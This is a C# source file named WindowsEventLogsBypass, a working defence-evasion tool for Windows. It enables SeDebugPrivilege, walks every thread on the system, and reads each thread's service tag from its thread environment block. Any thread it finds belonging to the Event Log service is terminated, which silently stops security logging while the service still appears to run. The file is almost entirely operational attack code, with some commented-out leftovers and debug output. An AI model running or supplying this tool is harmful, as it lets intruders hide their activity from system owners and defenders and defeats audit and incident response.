using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace WindowsEventLogsBypass
{
    public class Program
    {
		//Const
		private const Int32 ANYSIZE_ARRAY = 1;
		private const UInt32 TOKEN_QUERY = 0x0008;
		private const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
		private const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
		private const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
		//IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
		public static IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
	
		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool AdjustTokenPrivileges(
			IntPtr TokenHandle,
			[MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
			ref TOKEN_PRIVILEGES NewState,
			UInt32 BufferLengthInBytes,
			IntPtr PreviousState,
			out UInt32 ReturnLengthInBytes
		);

		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			UInt32 DesiredAccess, 
			out IntPtr TokenHandle
		);

		[DllImport("advapi32.dll")]
		static extern bool LookupPrivilegeValue(
			string lpSystemName, 
			string lpName,
			ref long lpLuid
		);

		[DllImport("advapi32.dll", SetLastError = true)]
		static extern ulong I_QueryTagInformation(
			IntPtr MachineName,
			SC_SERVICE_TAG_QUERY_TYPE InfoLevel,
			ref _SC_SERVICE_TAG_QUERY TagInfo
		);


		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr GetCurrentProcess();

		[DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
		static extern IntPtr CreateToolhelp32Snapshot([In] UInt32 dwFlags, [In] UInt32 th32ProcessID);

		[DllImport("kernel32.dll")]
		static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

		[DllImport("kernel32.dll")]
		public static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool CloseHandle(IntPtr hObject);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(
			uint processAccess,
			bool bInheritHandle,
			IntPtr processId
		);

		[DllImport("kernel32.dll")]
		public static extern void RtlZeroMemory(
			IntPtr pBuffer,
			int length
		);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern int SuspendThread(IntPtr hThread);


		[DllImport("ntdll.dll")]
		public static extern UInt32 NtQueryInformationThread(
			IntPtr handle, 
			uint infclass, 
			ref THREAD_BASIC_INFORMATION info, 
			uint length,
			UInt32 bytesread
		);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern Boolean NtReadVirtualMemory(
			IntPtr ProcessHandle,
			IntPtr BaseAddress,
			IntPtr Buffer,
			UInt64 NumberOfBytesToRead,
			ref UInt64 liRet
		);


		//Struct 
		[StructLayout(LayoutKind.Sequential, Pack = 4)]
		public struct LUID_AND_ATTRIBUTES
		{
			public long Luid;
			public UInt32 Attributes;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 4)]
		public struct TOKEN_PRIVILEGES
		{
			public int PrivilegeCount;
			public LUID_AND_ATTRIBUTES Privileges;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]

		public struct THREADENTRY32
		{
			internal UInt32 dwSize;
			internal UInt32 cntUsage;
			internal UInt32 th32ThreadID;
			internal UInt32 th32OwnerProcessID;
			internal UInt32 tpBasePri;
			internal UInt32 tpDeltaPri;
			internal UInt32 dwFlags;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct CLIENT_ID
		{
			public IntPtr UniqueProcess;
			public IntPtr UniqueThread;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct THREAD_BASIC_INFORMATION
		{
			public int ExitStatus;
			public IntPtr TebBaseAdress;
			public CLIENT_ID ClientId;
			public IntPtr AffinityMask;
			public int Priority;
			public int BasePriority;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct _SC_SERVICE_TAG_QUERY
		{
			public UInt32 processId;
			public UInt32 serviceTag;
			public UInt32 reserved;
			public IntPtr pBuffer;
		}
		

		[Flags]
		public enum ThreadAccess : int
		{
			THREAD_ALL_ACCESS = 0x001F03FF,
			TERMINATE = (0x0001),
			SUSPEND_RESUME = (0x0002),
			GET_CONTEXT = (0x0008),
			SET_CONTEXT = (0x0010),
			SET_INFORMATION = (0x0020),
			QUERY_INFORMATION = (0x0040),
			SET_THREAD_TOKEN = (0x0080),
			IMPERSONATE = (0x0100),
			DIRECT_IMPERSONATION = (0x0200)
		}

		public enum NTSTATUS : uint
		{
			Success = 0,
			Informational = 0x40000000,
			Error = 0xc0000000
		}

		public enum SC_SERVICE_TAG_QUERY_TYPE : UInt16 
		{
			ServiceNameFromTagInformation = 1,
			ServiceNamesReferencingModuleInformation = 2,
			ServiceNameTagMappingInformation = 3
		}

	//Flags
	[Flags]
		public enum SnapshotFlags : uint
		{

			HeapList = 0x00000001,
			Process = 0x00000002,
			Thread = 0x00000004,
			Module = 0x00000008,
			Module32 = 0x00000010,
			Inherit = 0x80000000,
			All = 0x0000001F,
			NoHeaps = 0x40000000
		}


		public enum PrivilegeNames
		{
			SeCreateTokenPrivilege,
			SeAssignPrimaryTokenPrivilege,
			SeLockMemoryPrivilege,
			SeIncreaseQuotaPrivilege,
			SeUnsolicitedInputPrivilege,
			SeMachineAccountPrivilege,
			SeTcbPrivilege,
			SeSecurityPrivilege,
			SeTakeOwnershipPrivilege,
			SeLoadDriverPrivilege,
			SeSystemProfilePrivilege,
			SeSystemtimePrivilege,
			SeProfileSingleProcessPrivilege,
			SeIncreaseBasePriorityPrivilege,
			SeCreatePagefilePrivilege,
			SeCreatePermanentPrivilege,
			SeBackupPrivilege,
			SeRestorePrivilege,
			SeShutdownPrivilege,
			SeDebugPrivilege,
			SeAuditPrivilege,
			SeSystemEnvironmentPrivilege,
			SeChangeNotifyPrivilege,
			SeRemoteShutdownPrivilege,
			SeUndockPrivilege,
			SeSyncAgentPrivilege,
			SeEnableDelegationPrivilege,
			SeManageVolumePrivilege,
			SeImpersonatePrivilege,
			SeCreateGlobalPrivilege,
			SeTrustedCredManAccessPrivilege,
			SeRelabelPrivilege,
			SeIncreaseWorkingSetPrivilege,
			SeTimeZonePrivilege,
			SeCreateSymbolicLinkPrivilege
		}

		[Flags]
		public enum ProcessAccessFlags : uint
		{
			All = 0x001F0FFF,
			Terminate = 0x00000001,
			CreateThread = 0x00000002,
			VirtualMemoryOperation = 0x00000008,
			VirtualMemoryRead = 0x00000010,
			VirtualMemoryWrite = 0x00000020,
			DuplicateHandle = 0x00000040,
			CreateProcess = 0x000000080,
			SetQuota = 0x00000100,
			SetInformation = 0x00000200,
			QueryInformation = 0x00000400,
			QueryLimitedInformation = 0x00001000,
			Synchronize = 0x00100000
		}

		public static void TerminateEventlogThread(UInt32 tid)
		{
			IntPtr hThread = OpenThread(ThreadAccess.TERMINATE, false, tid);
			
			if (TerminateThread(hThread, 0))
            {
				Console.WriteLine("--> Success !\n");
			}			
			else
				Console.WriteLine("--> Error !\n");

			// SuspendThread(hThread);
			CloseHandle(hThread);
		}


		public static bool GetServiceTagString(IntPtr processId, ulong tag, ref IntPtr pBuffer)
		{

			bool success = false;
			// HMODULE advapi32 = NULL;
			// FN_I_QueryTagInformation pfnI_QueryTagInformation = NULL;
			_SC_SERVICE_TAG_QUERY tagQuery = new _SC_SERVICE_TAG_QUERY();
			string tagstr = "";

			do
			{

				tagQuery.processId = (UInt32)processId;
				tagQuery.serviceTag = (UInt32)tag;
				tagQuery.reserved = 0;
				tagQuery.pBuffer = IntPtr.Zero;

				// IntPtr tagQ_addr = Marshal.AllocHGlobal(Marshal.SizeOf(tagQuery));
				// RtlZeroMemory(tagQ_addr, Marshal.SizeOf(tagQuery));
				// Marshal.StructureToPtr(tagQuery, tagQ_addr, true);


				ulong QueryReturn = I_QueryTagInformation(IntPtr.Zero, SC_SERVICE_TAG_QUERY_TYPE.ServiceNameFromTagInformation, ref tagQuery);
				Console.WriteLine("QueryResult: " + QueryReturn);

				if (QueryReturn == 0)
				{
					// StringCbCopy(pBuffer, bufferSize, (PCWSTR)tagQuery.pBuffer);
					// LocalFree(tagQuery.pBuffer);
					Console.WriteLine("QueryResult: " + QueryReturn);
					Console.WriteLine(tagQuery.pBuffer.ToString());
					tagstr = Marshal.PtrToStringUni(tagQuery.pBuffer);
					Console.WriteLine(tagstr);
					Console.WriteLine(tagstr.Length);

					if (tagQuery.pBuffer != IntPtr.Zero)
                    {
						pBuffer = tagQuery.pBuffer;
					}
					
					// Marshal.Copy(tagQuery.pBuffer, 0, pBuffer, tagstr.Length);
					success = true;
				}
				Console.WriteLine("BufferToString: " + tagQuery.pBuffer.ToString());
			} while (false);

			return success;
		 }

		public static bool GetServiceTag(IntPtr processId, IntPtr threadId, ref ulong pServiceTag)
		{

			bool success_status = false;
			// BOOL bIsWoW64 = FALSE;
			
			uint status = 0;
			// FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL;
			THREAD_BASIC_INFORMATION tbi = new THREAD_BASIC_INFORMATION();
			IntPtr process = IntPtr.Zero;
			IntPtr thread = IntPtr.Zero;
			UInt64 subProcessTag = 0;
			UInt64 subProcessTag_Offset = 0;

			thread = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)threadId);
			if ((uint)thread == 0) 
			{
				Console.WriteLine(Marshal.GetLastWin32Error());
				return success_status;
				
			}

			uint sizePtr = 0;
            status = NtQueryInformationThread(thread, 0, ref tbi, (uint)Marshal.SizeOf(tbi), sizePtr);
            if (status != 0)
            {
				Console.WriteLine(Marshal.GetLastWin32Error());
				return success_status;
			}

			process = OpenProcess((uint)ProcessAccessFlags.VirtualMemoryRead, false, processId);
			if((uint)process == 0)
            {
				Console.WriteLine(Marshal.GetLastWin32Error());
				return success_status;
			}

			subProcessTag_Offset = 0x1720;
			UInt64 byteRead = 0;
			IntPtr pMemLoc = Marshal.AllocHGlobal(Marshal.SizeOf(subProcessTag));
			RtlZeroMemory(pMemLoc, Marshal.SizeOf(subProcessTag));
			
			bool readstaus = NtReadVirtualMemory(
				process,
				(IntPtr)((UInt64)tbi.TebBaseAdress + subProcessTag_Offset),
				pMemLoc,
				(uint)Marshal.SizeOf(subProcessTag),
				ref byteRead
			);

			Console.WriteLine("Readstatus Error: " + Marshal.GetLastWin32Error());
			Console.WriteLine("Readstatus: " + readstaus.ToString());
			
			subProcessTag = (uint)Marshal.ReadInt64(pMemLoc, 0);
			Console.WriteLine("subProcessTag: " + subProcessTag);

			if (subProcessTag == 0)
            {
				Console.WriteLine(Marshal.GetLastWin32Error());
				return success_status;
			}
			else
            {
				pServiceTag = (ulong)subProcessTag;
			}

			if ((uint)process != 0) CloseHandle(process);
			if ((uint)thread != 0) CloseHandle(thread);

			success_status = true;
			return success_status;

		}



		public static bool GetServiceTagName(UInt32 tid)
		{
			const int MAX_PATH = 260;
			IntPtr hThread = OpenThread(ThreadAccess.QUERY_INFORMATION, false, tid);
			if (0 == (int)hThread)
			{
				Console.WriteLine("OpenThread : Error:" + Marshal.GetLastWin32Error());
				return false;
			}

			THREAD_BASIC_INFORMATION tbi = new THREAD_BASIC_INFORMATION();

			UInt32 sizePtr = 0;
			UInt32 queryResult = NtQueryInformationThread(hThread, 0, ref tbi, (uint)Marshal.SizeOf(tbi), sizePtr);
			IntPtr processid = tbi.ClientId.UniqueProcess;

			ulong serviceTag = 0;
			if (GetServiceTag(processid, (IntPtr)tid, ref serviceTag) == false)
			{
				return false;
			}

			// string[] tagString = new string[260];
			// IntPtr tarString_addr = Marshal.StringToHGlobalAnsi(tagString);
			IntPtr pData = new IntPtr();

			//  iDataLen = MAX_PATH / 2;
			// byte[] byData = new byte[MAX_PATH];
			// pData = Marshal.SizeOf(MAX_PATH);

			pData = Marshal.AllocHGlobal(MAX_PATH);
			RtlZeroMemory(pData, MAX_PATH);

			// string strData = System.Text.Encoding.ASCII.GetString(byData);

			if (GetServiceTagString(processid, serviceTag, ref pData) == false)
			{
				return false;
			}

			Console.WriteLine(pData);
			string tagString = Marshal.PtrToStringUni(pData);

			if (string.Equals(tagString, "eventlog", StringComparison.OrdinalIgnoreCase))
			{
				Console.WriteLine("Get eventlog thread:" + tid + ", Start to kill thread:" + tid);
				TerminateEventlogThread(tid);
				
			}
			return true;
			// Console.WriteLine(tagString);
			/*
			WCHAR tagString[MAX_PATH] = { 0 };
			if (GetServiceTagString(pid, serviceTag, tagString, sizeof(tagString)) == FALSE)
			{
				return 0;
			}
			//    wprintf(L"Service Tag Name : %s\n", tagString);
			_wcslwr_s(tagString, wcslen(tagString) + 1);
			if (wcscmp(tagString, L"eventlog") == 0)
			{
				printf("[!] Get eventlog thread,%d!	--> try to kill ", tid);
				TerminateEventlogThread(tid);
			}
			*/



		}

		public static bool ListProcessThreads()
        {
			IntPtr hThreadSnap = INVALID_HANDLE_VALUE;
			THREADENTRY32 te32 = new THREADENTRY32();
			hThreadSnap = CreateToolhelp32Snapshot((uint)SnapshotFlags.Thread, 0);

			if (hThreadSnap == INVALID_HANDLE_VALUE)
			{
				Console.WriteLine("CreateToolhelp32Snapshot Failed");
				return false;
			}

			te32.dwSize = (uint)Marshal.SizeOf(te32);

			if (!Thread32First(hThreadSnap, ref te32))
			{
				Console.WriteLine("Thread32First");
				CloseHandle(hThreadSnap);
				return (false);
			}
			do
			{
				if(te32.th32OwnerProcessID == 0)
                {
					continue;
                }

				/*
                if (te32.th32OwnerProcessID == 1492)
                {
                    // Console.WriteLine("Owner PID:" + te32.th32OwnerProcessID);
                    Console.WriteLine("ThreadID:" + te32.th32ThreadID);
                    GetServiceTagName(te32.th32ThreadID);
                }
				*/

                //Console.WriteLine("Owner PID:" + te32.th32OwnerProcessID);
                //Console.WriteLine("ThreadID:" + te32.th32ThreadID);
                GetServiceTagName(te32.th32ThreadID);
                //GetServiceTagName(te32.th32ThreadID);
                /*
				if (te32.th32OwnerProcessID == pid)
				{
					//  printf("tid= %d\n",te32.th32ThreadID);  
					//	GetServiceTagName(te32.th32ThreadID);
				}
				*/
            } while (Thread32Next(hThreadSnap, ref te32));
			
			CloseHandle(hThreadSnap);



			return true;
        }

		public static bool SetPrivilege()
        {
			IntPtr hToken;
			TOKEN_PRIVILEGES NewState = new TOKEN_PRIVILEGES();
			long luidPrivilegeLUID = 0;

			bool success_open = false;

			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,  out hToken) || 
				!LookupPrivilegeValue(null, PrivilegeNames.SeDebugPrivilege.ToString(), ref luidPrivilegeLUID))
			{
				Console.WriteLine("SetPrivilege Error\n");
				return false;
			}

			NewState.PrivilegeCount = 1;
			NewState.Privileges.Luid = luidPrivilegeLUID;
			NewState.Privileges.Attributes = SE_PRIVILEGE_ENABLED;

			uint temp = 0;

			if (!AdjustTokenPrivileges(hToken, false, ref NewState, 0, IntPtr.Zero, out temp))
			{
				Console.WriteLine("AdjustTokenPrivilege Errro\n");
				return false;
			}

			// OpenProcess((uint)ProcessAccessFlags.All, false, (IntPtr)1316);
			// Console.WriteLine(Marshal.GetLastWin32Error());

			return true;
        }

		/*
		 *  public static bool SetPrivileges()
        {
            IntPtr hProc;
            IntPtr hToken;
            long luid_Security;
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();

            // get the process token
            hProc = Process.GetCurrentProcess().Handle;
            hToken = IntPtr.Zero;
            if (!(OpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref hToken)))
            {
                return false;
            }

            // lookup the ID for the privilege we want to enable
            luid_Security = 0;
            //if (!(LookupPrivilegeValue(null, SE_SECURITY_NAME, ref luid_Security)))
            if (!(LookupPrivilegeValue(null, SE_DEBUG_NAME, ref luid_Security)))
            {
                return false;
            }

            tp.PrivilegeCount = 1;
            tp.Privilege1.Luid = luid_Security;
            tp.Privilege1.Attributes = SE_PRIVILEGE_ENABLED;

            // enable the privilege
            if (!(AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero)))
            {
                return false;
            }
            return true;
        }
		*/

		public static void Main(string[] args)
        {
			SetPrivilege();
			ListProcessThreads();
			//System.Threading.Thread.Sleep(100000);

        }
    }
}
